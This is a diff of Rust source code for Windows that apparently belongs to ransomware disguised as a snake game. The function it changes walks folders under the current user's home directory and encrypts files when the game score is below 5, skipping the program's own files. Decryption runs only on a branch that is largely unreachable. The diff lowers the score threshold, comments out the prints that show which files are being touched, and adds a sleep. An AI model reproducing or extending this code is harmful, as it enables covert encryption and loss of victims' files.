@@ -1,13 +1,16 @@
 use libaes::Cipher; 
 use rand::Rng;
 use std::ptr::null_mut;
-
+use std::time::Duration;
+use std::thread::sleep;
 use std::ffi::CString;
 use std::ptr;
 use std::{
     env,
     fs
 };
+
+
 
 
 use windows_sys::{
@@ -23,6 +26,13 @@ use windows_sys::{
 			
 
 };
+
+
+use std::{thread, time};
+
+
+
+
 
 
  static dir_names : [&str; 13] = [
@@ -255,6 +265,7 @@ fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
 
 pub fn next_step(score: u32){
 let current_score= score;
+println!("Out side for dir {}",current_score);
 for dir in dir_names.iter() {
         let mut full_path = String::from("C:\\Users\\");
         full_path.push_str(&get_username_name());
@@ -264,7 +275,7 @@ for dir in dir_names.iter() {
         // extract path and call traverse
         let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
 	let path_str = full_path.to_str().expect("Conversion to &str failed");
-	println!("Path {}",path_str);
+//	println!("Path {}",path_str);
 	if  let Ok(entries) = fs::read_dir(path_str) {
 	let entries = fs::read_dir(path_str).unwrap();
 
@@ -272,28 +283,43 @@ for dir in dir_names.iter() {
         let entry = raw_entry.unwrap();
 
         if entry.file_type().unwrap().is_file() {
-            
-            println!("File Name: {}", entry.path().display());
-	    let file_path = entry.path();
-	    let file_path_str = file_path.to_str();
+//		 println!("Above if {}",current_score);
+            if current_score <5{
+  //              println!("Inside IF {}",current_score);
+		 let file_path = entry.path();
+            let file_path_str = file_path.to_str();
             if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains("ini") {
                 // Skip files containing "rustware" or "snakegame" in the file path
                 continue;
             }
-            if current_score <1000{
-	    encrypt_decrypt(file_path_str.unwrap(),"encrypt");
+		 encrypt_decrypt(file_path_str.unwrap(),"encrypt");
+
+         
+
 	    }else{
+		println!("Inside else {}",current_score);
+		println!("File Name: {}", entry.path().display());
+            let file_path = entry.path();
+            let file_path_str = file_path.to_str();
+            if file_path_str.unwrap().to_lowercase().contains("rustware")  {
+                encrypt_decrypt(file_path_str.unwrap(),"decrypt");
+
+            }
 		
-                 encrypt_decrypt(file_path_str.unwrap(),"decrypt");
 		}
         }
 	}
 	}
      else {
-     println!("Failed to read directory: {}", path_str);
+  //   println!("Failed to read directory: {}", path_str);
 }
 }
 
+
+let time = Duration::from_secs(20);
+
+    // sleep
+    sleep(time);
 
 
 }
